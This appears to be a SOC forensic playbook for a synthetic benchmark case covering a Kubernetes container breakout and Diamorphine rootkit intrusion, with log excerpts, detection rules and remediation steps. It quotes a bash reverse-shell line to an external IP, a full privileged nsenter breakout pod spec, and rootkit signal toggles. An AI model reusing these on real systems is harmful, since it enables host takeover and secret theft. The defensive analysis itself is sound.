# SOC INVESTIGATION & FORENSIC PLAYBOOK
## Benchmark Case 4: Kubernetes Linux Container Breakout & Kernel Rootkit Intrusion
**Target Evidence Path:** `D:\Security-logs-test\attack-cases-benchmark\case-4-k8s-linux-container-breakout\raw-logs`  
**Classification:** Advanced Persistent Threat (APT) / Cloud-Native Privilege Escalation & Container Escape  
**Overall Threat Severity:** **CRITICAL (Threat Score: 100 / 100)**  
**Target Environment:** Production Kubernetes Cluster (Worker Node: `k8s-worker-node-01`, Linux Kernel 5.15.0-89-generic)  

---

## 1. Incident Overview & Executive Summary

This investigation guide provides Security Operations Center (SOC) Tier-2/Tier-3 analysts, Incident Responders (DFIR), and Threat Hunters with a standardized, evidence-backed methodology for analyzing the raw forensic artifacts in Case 4.

The incident represents a multi-tiered, cloud-native intrusion traversing four distinct security boundaries:
1. **Application Layer:** Unauthorized command execution and crontab weaponization under service account `www-data`.
2. **Host OS Layer:** Outbound interactive reverse shell, local lateral movement to user `deploy`, and unconstrained `sudo /bin/bash` privilege escalation to `root`.
3. **Kernel Layer:** Loading and memory-unlinking of the **Diamorphine Loadable Kernel Module (LKM) rootkit** to subvert operating system integrity and hook core system calls.
4. **Kubernetes Control Plane:** Abuse of an over-privileged mounted ServiceAccount (`webapp-sa`), creation of an unconstrained privileged breakout pod (`system-health-diagnostics-pod`) using `nsenter` to hijack the host PID 1 namespace, cluster-level administrative persistence (`ClusterRoleBinding`), and wholesale exfiltration of all Kubernetes secrets.

---

## 2. Forensic Log Inventory & Architecture Map

The `raw-logs` directory contains four complementary telemetry streams that must be correlated across time and identity:

```
D:\Security-logs-test\attack-cases-benchmark\case-4-k8s-linux-container-breakout\raw-logs\
│
├── k8s_api_audit.json          # Kubernetes API Server audit stream (audit.k8s.io/v1)
├── linux_audit.log             # Linux Kernel Audit daemon (auditd) syscall traces
├── linux_auth.log              # PAM authentication, SSH logins, sudo executions & cron events
└── linux_dmesg_syslog.log      # Kernel ring buffer, driver messages, and module tainting records
```

### Log Source Cross-Reference Table

| Log File | Format | Key Monitored Fields | Attack Stages Captured |
| :--- | :--- | :--- | :--- |
| `linux_auth.log` | Syslog / PAM | `user`, `TTY`, `COMMAND`, `CRON`, `sshd`, `Accepted password/publickey` | Stage 1 (Sudo probe), Stage 2-3 (Cron reverse shell), Stage 4-5 (Local SSH & Sudo root) |
| `linux_audit.log` | Auditd SYSCALL/EXECVE | `syscall=257` (`openat`), `syscall=313` (`finit_module`), `key`, `exe`, `auid` | Stage 6 (Shadow file access), Stage 7 (Diamorphine rootkit insertion) |
| `linux_dmesg_syslog.log` | Kernel Ring Buffer | `[timestamp]`, `module taints kernel`, `hooked sys_call_table`, `nsenter` | Stage 7 (Rootkit hook & unlinking), Stage 9 (nsenter host namespace takeover) |
| `k8s_api_audit.json` | K8s Audit JSON | `requestURI`, `verb`, `user.username`, `sourceIPs`, `requestObject`, `annotations` | Stage 8 (Pod discovery), Stage 9 (Privileged pod creation), Stage 10 (ClusterRoleBinding), Stage 11 (Secrets dump) |

---

## 3. High-Fidelity Attack Kill Chain & Evidence Timeline

```
[08:34:22]  [Host] Recon: www-data tests sudoers for /etc/shadow ── Denied (linux_auth.log)
    │
[08:38:45]  [Host] Persistence: www-data alters crontab (linux_auth.log)
    │
[08:39:01]  [Host] C2 Reverse Shell: bash connects to 198.51.100.77:4444 (linux_auth.log)
    │
[08:41:50]  [Host] Local SSH Pivot: Password logon to 'deploy' via 127.0.0.1 (linux_auth.log)
    │
[08:42:05]  [Host] Privilege Escalation: 'deploy' executes sudo /bin/bash -> Root (linux_auth.log)
    │
[08:42:15]  [Host] Credential Theft: Root accesses /etc/shadow (linux_audit.log: shadow_access)
    │
[08:45:30]  [Host/Kernel] Rootkit: insmod diamorphine.ko hooks syscalls & unlinks (linux_audit.log & dmesg)
    │
[08:48:12]  [K8s] API Discovery: webapp-sa lists pods in kube-system (k8s_api_audit.json)
    │
[08:50:04]  [K8s/Host] Container Breakout: Privileged pod created with nsenter --target 1 (k8s_api_audit.json & dmesg)
    │
[08:52:18]  [K8s] Cluster Persistence: ClusterRoleBinding system-cluster-admin-binding created (k8s_api_audit.json)
    │
[08:53:40]  [K8s] Data Exfiltration: Mass harvest of all K8s secrets across cluster (k8s_api_audit.json)
```

---

## 4. Phase-by-Phase SOC Investigation Playbook

### Phase 1: Host-Level Triage & Reverse Shell Identification
**Target Log:** `linux_auth.log`

#### 1.1 Analyze Unauthorized Sudo Probes
Inspect `linux_auth.log` around `08:34:22 UTC` for initial command injection attempts:
```text
Sep 14 08:34:22 k8s-worker-node-01 sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Sep 14 08:35:10 k8s-worker-node-01 sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id
```
- **Finding:** The service account `www-data` has been hijacked within the web application root `/var/www/html`. The actor is performing manual privilege enumeration.

#### 1.2 Detect Crontab Backdoor & Outbound C2
Inspect crontab modifications and subsequent cron executions between `08:38:10` and `08:39:01`:
```text
Sep 14 08:38:10 k8s-worker-node-01 crontab[16201]: (www-data) BEGIN EDIT (www-data)
Sep 14 08:38:45 k8s-worker-node-01 crontab[16201]: (www-data) REPLACE (www-data)
Sep 14 08:39:01 k8s-worker-node-01 CRON[16241]: (www-data) CMD (/bin/bash -c "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1")
```
- **Finding:** The actor establishes persistence via user crontab and spawns an interactive TCP reverse shell to external C2 IP `198.51.100.77` on port `4444`.
- **Primary IoC:** `198.51.100.77:4444` (External C2).

---

### Phase 2: Host Lateral Movement & Root Privilege Escalation
**Target Logs:** `linux_auth.log` & `linux_audit.log`

#### 2.1 Trace Local SSH Pivot
Review SSH logs at `08:41:50`:
```text
Sep 14 08:41:50 k8s-worker-node-01 sshd[17105]: Accepted password for deploy from 127.0.0.1 port 52310 ssh2
Sep 14 08:41:50 k8s-worker-node-01 sshd[17105]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
Sep 14 08:41:50 k8s-worker-node-01 systemd-logind[742]: New session 21 of user deploy.
```
- **Finding:** Attacker pivots from the reverse shell into the local service account `deploy` via loopback SSH (`127.0.0.1`), avoiding network perimeter detection.

#### 2.2 Identify Sudo Abuse to Root
At `08:42:05`, review `deploy` user commands:
```text
Sep 14 08:42:05 k8s-worker-node-01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Sep 14 08:42:05 k8s-worker-node-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
```
- **Finding:** Sudo configuration allows `deploy` to run `/bin/bash` as `root` without password restriction or with known credentials. Full root access achieved on worker node.

#### 2.3 Investigate Credential Harvesting (/etc/shadow)
In `linux_audit.log`, search for the audit key `shadow_access`:
```text
type=SYSCALL msg=audit(1789461735.812:1042): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55d2b1f8c210 a2=0 a3=0 items=1 ppid=17112 pid=17180 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=21 comm="cat" exe="/usr/bin/cat" subj=unconfined key="shadow_access"
type=EXECVE msg=audit(1789461735.812:1042): argc=2 a0="cat" a1="/etc/shadow"
type=CWD msg=audit(1789461735.812:1042): cwd="/home/deploy"
type=PATH msg=audit(1789461735.812:1042): item=0 name="/etc/shadow" inode=131089 dev=fc:00 mode=0100640 ouid=0 ogid=42
```
- **Finding:** The root session (`auid=1001`, session 21) dumped the host password hashes from `/etc/shadow`.

---

### Phase 3: Deep Kernel Rootkit Forensics (Diamorphine LKM)
**Target Logs:** `linux_audit.log` & `linux_dmesg_syslog.log`

#### 3.1 Kernel Module Loading Execution
In `linux_audit.log`, search for `syscall=313` (`finit_module`) or audit key `kernel_module_load`:
```text
type=SYSCALL msg=audit(1789461930.304:1058): arch=c000003e syscall=313 success=yes exit=0 a0=3 a1=55c1e0a920b0 a2=0 a3=0 items=1 ppid=17185 pid=17240 auid=1001 uid=0 gid=0 comm="insmod" exe="/usr/bin/kmod" key="kernel_module_load"
type=EXECVE msg=audit(1789461930.304:1058): argc=2 a0="insmod" a1="diamorphine.ko"
type=KERN_MODULE msg=audit(1789461930.304:1058): name="diamorphine"
type=PATH msg=audit(1789461930.304:1058): item=0 name="/home/deploy/diamorphine.ko" inode=262188
```

#### 3.2 Kernel Ring Buffer & Syscall Table Subversion
Cross-reference `linux_dmesg_syslog.log` at timestamp offset `[ 4512.890123 - 4512.891054]`:
```text
[ 4512.890123] diamorphine: loading out-of-tree module taints kernel.
[ 4512.890125] diamorphine: module verification failed: signature and/or required key missing - tainting kernel
[ 4512.891045] [diamorphine] loaded successfully: hooked sys_call_table at 0xffffffff82000280
[ 4512.891050] [diamorphine] hooked sys_getdents64, sys_kill
[ 4512.891054] [diamorphine] stealth module unlinked from /sys/module/
```
- **Forensic Assessment of Diamorphine Capabilities:**
  - **Hooked `sys_call_table` at `0xffffffff82000280`:** Alters kernel memory pointers to route critical system calls through rootkit handlers.
  - **Hooked `sys_getdents64`:** Intercepts directory reading calls. Automatically conceals files, directories, and processes matching specific identifiers (e.g., `diamorphine_secret` or PIDs) from standard tools like `ls`, `ps`, `top`.
  - **Hooked `sys_kill`:** Intercepts POSIX signals. Sends special undocumented signal integers (e.g., `kill -31 <pid>` to toggle root privileges or `kill -63 <pid>` to toggle invisibility).
  - **Unlinked from `/sys/module/`:** Surgically unlinks itself from the Linux kernel module list (`modules.kmod`). As a result, standard commands like `lsmod` and `modinfo` will **NOT** show `diamorphine` loaded!

---

### Phase 4: Kubernetes Container Escape & Node Takeover
**Target Logs:** `k8s_api_audit.json` & `linux_dmesg_syslog.log`

#### 4.1 ServiceAccount Token Discovery
Review API audit entry 4 in `k8s_api_audit.json`:
- **Timestamp:** `2026-09-14T08:48:12.110294Z`
- **Identity:** `system:serviceaccount:frontend-apps:webapp-sa` (`uid: 7e8f9a01-2b3c-4d5e-a6f7-890123456789`)
- **Source IP:** `10.244.1.45` (Pod CIDR)
- **User Agent:** `kubectl/v1.28.0 (linux/amd64) attacker-probe`
- **Request:** `GET /api/v1/namespaces/kube-system/pods`
- **Decision:** `allow` via RoleBinding `webapp-pod-reader` in namespace `kube-system`.

#### 4.2 Privileged Pod Deployment & nsenter Breakout
Review API audit entry 5 in `k8s_api_audit.json` at `08:50:04.220194Z`:
- **Verb:** `create`
- **Resource:** `pods` in namespace `kube-system`
- **Pod Name:** `system-health-diagnostics-pod`
- **Malicious Pod Specifications:**
  ```json
  {
    "spec": {
      "hostPID": true,
      "hostNetwork": true,
      "hostIPC": true,
      "restartPolicy": "Never",
      "containers": [{
        "name": "breakout-agent",
        "image": "alpine:3.18",
        "command": ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/sh"],
        "securityContext": {
          "privileged": true,
          "capabilities": {"add": ["SYS_ADMIN", "SYS_PTRACE", "SYS_RAWIO"]}
        },
        "volumeMounts": [{"name": "host-root", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host-root", "hostPath": {"path": "/", "type": "Directory"}}]
    }
  }
  ```
- **Authorization:** Permitted by ClusterRoleBinding `cluster-pod-manager`.
- **Scheduled Node:** `k8s-worker-node-01`.

#### 4.3 Kernel Execution Confirmation of Container Breakout
Review `linux_dmesg_syslog.log` lines 30-35 at timestamp offset `[ 4620.104218 - 4622.102940]`:
```text
[ 4620.104218] runc:[2:INIT] mounted /sys/fs/cgroup with rw permissions
[ 4621.501233] process 24891 (nsenter) entering host pid namespace
[ 4621.501240] process 24891 (nsenter) entering host ipc namespace
[ 4621.501242] process 24891 (nsenter) entering host net namespace
[ 4621.501245] process 24891 (nsenter) mounted host root path / to /host
[ 4622.102940] device veth98a21f entered promiscuous mode
```
- **Breakout Mechanism Explained:** `nsenter --target 1` commands the container process to enter the namespace of init (PID 1) on the host. Combined with `hostPID: true`, `privileged: true`, and the root host mount `/host`, the container achieves complete, unconstrained bidirectional root execution over the physical worker node.

---

### Phase 5: Cluster-Wide Privilege Escalation & Secrets Exfiltration
**Target Log:** `k8s_api_audit.json`

#### 5.1 RBAC ClusterRoleBinding Backdoor
Review API audit entry 6 in `k8s_api_audit.json` at `08:52:18.410932Z`:
- **Verb:** `create`
- **Endpoint:** `/apis/rbac.authorization.k8s.io/v1/clusterrolebindings`
- **Object Created:**
  - Name: `system-cluster-admin-binding`
  - RoleRef: `ClusterRole / cluster-admin`
  - Subjects: `ServiceAccount / webapp-sa` in `frontend-apps`
- **Annotation:** `RBAC: privilege escalation permitted via bound privileged serviceaccount`
- **Impact:** The compromised web application service account is now an unconstrained cluster super-administrator.

#### 5.2 Wholesale Cluster Secrets Dumping
Review API audit entry 7 in `k8s_api_audit.json` at `08:53:40.119280Z`:
- **Verb:** `list`
- **Endpoint:** `/api/v1/secrets` (Cluster-wide across all namespaces)
- **User:** `system:serviceaccount:frontend-apps:webapp-sa`
- **Authorization:** `allowed by ClusterRoleBinding "system-cluster-admin-binding"`
- **Response Code:** `200 OK`
- **Impact:** Complete exposure of all database passwords, API tokens, TLS private keys, and service credentials cluster-wide.

---

## 5. False Positive & Benign Activity Disambiguation

SOC analysts must filter out background noise that matches standard operational profiles:

| Operational Activity | Log File & Identifiers | Distinguishing Characteristics | Analyst Ruling |
| :--- | :--- | :--- | :--- |
| **Admin SSH Maintenance** | `linux_auth.log`<br>`sshd[13420]` for `sysadmin` from `10.0.4.15` | Authenticated via authorized RSA key; executed `sudo systemctl status nginx` and reviewed `access.log`; cleanly disconnected. | **BENIGN** |
| **Sysstat Performance Accounting** | `linux_auth.log` & `linux_audit.log`<br>`CRON: debian-sa1 1 1` (PID 18121) | Runs every 5 minutes from system cron table; normal OS performance collector. | **BENIGN** |
| **Kubelet & Controller Sync** | `k8s_api_audit.json`<br>`system:kube-controller-manager`<br>`system:node:k8s-worker-node-01` | Periodic status updates (`PATCH /api/v1/nodes/.../status`) originating from node IP `10.0.4.21`. | **BENIGN** |
| **Kernel Hardware Drivers** | `linux_dmesg_syslog.log`<br>Lines 1-24 (`e1000e`, `EXT4-fs`, `autofs4`) | Hardware detection during standard system startup; signed standard kernel drivers. | **BENIGN** |

---

## 6. SOC Analyst Command & Query Toolkit

When investigating the raw logs in `D:\Security-logs-test\attack-cases-benchmark\case-4-k8s-linux-container-breakout\raw-logs`, execute these commands:

### 6.1 Kubernetes API Audit Analysis (`jq`)
```bash
# 1. Detect all requests made with suspicious or non-standard User-Agents
jq -r '. | select(.userAgent | test("attacker|curl|python"; "i")) | "\(.requestReceivedTimestamp) [\(.verb)] \(.requestURI) from \(.sourceIPs[]) by \(.user.username)"' k8s_api_audit.json

# 2. Extract Pods created with privileged security context or host namespaces
jq -r '. | select(.verb=="create" and .objectRef.resource=="pods") | {timestamp: .requestReceivedTimestamp, pod: .objectRef.name, user: .user.username, spec: .requestObject.spec}' k8s_api_audit.json

# 3. Detect any ClusterRoleBinding creations
jq -r '. | select(.objectRef.resource=="clusterrolebindings" and .verb=="create") | {timestamp: .requestReceivedTimestamp, name: .requestObject.metadata.name, role: .requestObject.roleRef.name, subjects: .requestObject.subjects}' k8s_api_audit.json

# 4. Detect mass secrets enumeration
jq -r '. | select(.objectRef.resource=="secrets" and (.verb=="list" or .verb=="get")) | "\(.requestReceivedTimestamp) Secrets access by \(.user.username) - Allowed: \(.annotations."authorization.k8s.io/decision")"' k8s_api_audit.json
```

### 6.2 Linux Auth Log Forensics (`grep` / `awk`)
```bash
# 1. Identify all failed and successful sudo commands
grep -E "sudo:.*COMMAND=" linux_auth.log

# 2. Extract crontab edits and reverse shells
grep -E "crontab|/dev/tcp" linux_auth.log

# 3. Trace SSH sessions originating from loopback
grep -E "sshd.*from 127\.0\.0\.1" linux_auth.log
```

### 6.3 Linux Audit & Kernel Module Inspection
```bash
# 1. Search for shadow file access attempts
grep "shadow_access" linux_audit.log

# 2. Extract kernel module load events
grep -E "finit_module|diamorphine" linux_audit.log

# 3. Extract kernel hooking and tainting indicators from dmesg
grep -E "diamorphine|taints kernel|hooked|nsenter" linux_dmesg_syslog.log
```

---

## 7. Detection Engineering Rules (SIEM / Falco / Sigma)

### 7.1 Falco Rule: Container Breakout via nsenter into Host PID
```yaml
- rule: Container Breakout via Host Namespace Entry
  desc: Detects process entering host namespaces using nsenter within a container
  condition: >
    spawned_process and 
    container and 
    proc.name = "nsenter" and 
    (proc.cmdline contains "--target 1" or proc.cmdline contains "-t 1")
  output: >
    Critical Container Escape Detected (user=%user.name container_id=%container.id 
    image=%container.image.repository command=%proc.cmdline host_pid=%proc.pid)
  priority: CRITICAL
  tags: [container, mitre_privilege_escalation, T1611]
```

### 7.2 Falco Rule: Diamorphine LKM Rootkit Insertion
```yaml
- rule: Malicious Kernel Module Insertion
  desc: Detects insertion of unauthorized kernel module or known rootkits
  condition: >
    evt.type in (init_module, finit_module) and 
    (evt.arg[1] contains "diamorphine" or proc.cmdline contains "diamorphine")
  output: >
    Kernel Rootkit Loaded: %proc.cmdline (user=%user.name auid=%user.loginuid exe=%proc.exe)
  priority: CRITICAL
  tags: [host, rootkit, mitre_persistence, T1547.006, T1014]
```

### 7.3 Sigma Rule: Interactive Bash Reverse Shell via Cron
```yaml
title: Interactive Reverse Shell Spawned by Cron
id: 5a8e2b10-6c3d-4f9a-b2e1-7890abcdef12
status: experimental
description: Detects standard Unix reverse shell syntax launched by cron daemon
logsource:
  product: linux
  service: auth
detection:
  selection:
    - Message|contains|all:
        - 'CRON'
        - 'CMD'
        - '/dev/tcp/'
    - Message|contains|all:
        - 'bash -i'
        - '>&'
  condition: selection
level: critical
tags:
  - attack.execution
  - attack.t1059.004
  - attack.persistence
  - attack.t1053.003
```

### 7.4 Kubernetes Audit Policy: Privileged Pod Creation Alert (Splunk / Elastic)
```spl
index=k8s_audit objectRef.resource="pods" verb="create"
| search requestObject.spec.containers{}.securityContext.privileged=true OR requestObject.spec.hostPID=true
| table _time user.username sourceIPs{} objectRef.namespace objectRef.name requestObject.spec.containers{}.image requestObject.spec.containers{}.command{}
```

---

## 8. Incident Response, Containment & Remediation Plan

### Immediate Containment (SLA: < 15 Minutes)
1. **Isolate Worker Node `k8s-worker-node-01`:**
   - Execute node cordon and drain:
     ```bash
     kubectl cordon k8s-worker-node-01
     kubectl drain k8s-worker-node-01 --ignore-daemonsets --delete-emptydir-data --force
     ```
   - Disconnect `k8s-worker-node-01` network interface at the hypervisor or switch level (preserve VM state for memory acquisition).
2. **Terminate Malicious Pods:**
   ```bash
   kubectl delete pod system-health-diagnostics-pod -n kube-system --force --grace-period=0
   kubectl delete pod -n frontend-apps -l app=webapp --force --grace-period=0
   ```
3. **Revoke Malicious RBAC Bindings & Invalidate Compromised ServiceAccount:**
   ```bash
   kubectl delete clusterrolebinding system-cluster-admin-binding
   kubectl delete serviceaccount webapp-sa -n frontend-apps
   ```
4. **Block C2 Communication:**
   - Enforce perimeter firewall egress block for IP `198.51.100.77` on all ports.

### Live Forensic Acquisition (Before Reboot)
> [!CAUTION]
> **DO NOT REBOOT THE HOST IMMEDIATELY.** Because Diamorphine unlinked itself from `/sys/module/`, a standard reboot will destroy volatile in-memory evidence of the hooked syscall pointers.
1. Capture volatile memory dump using `LiME` (`Linux Memory Extractor`).
2. Verify hooked syscall addresses using volatility or kernel debugger:
   - Check `sys_call_table` pointer at `0xffffffff82000280`.
   - Inspect overwritten function pointers for `sys_getdents64` and `sys_kill`.
3. Locate artifact on disk: `/home/deploy/diamorphine.ko` (SHA256 hash and metadata).

### Eradication & Cluster Hardening
1. **Rebuild Worker Node:** Re-image `k8s-worker-node-01` from a clean, hardened golden image. Do not attempt in-place cleaning of a kernel-rootkitted system.
2. **Rotate All Cluster Secrets:**
   - Because `GET /api/v1/secrets` succeeded across the cluster, treat **ALL** Kubernetes secrets, TLS certs, database credentials, and service account tokens as compromised.
   - Run automated secret rotation across all namespaces.
3. **Enforce Pod Security Standards (PSS):**
   - Apply `restricted` or `baseline` profile on all application namespaces:
     ```yaml
     apiVersion: v1
     kind: Namespace
     metadata:
       name: frontend-apps
       labels:
         pod-security.kubernetes.io/enforce: restricted
         pod-security.kubernetes.io/enforce-version: latest
     ```
   - Explicitly block `hostPID`, `hostNetwork`, `hostIPC`, and `privileged: true`.
4. **Harden RBAC:**
   - Disallow ServiceAccounts in application namespaces from binding `cluster-admin` or managing pods in `kube-system`.
   - Remove `automountServiceAccountToken: true` from pods that do not interact with the Kubernetes API.
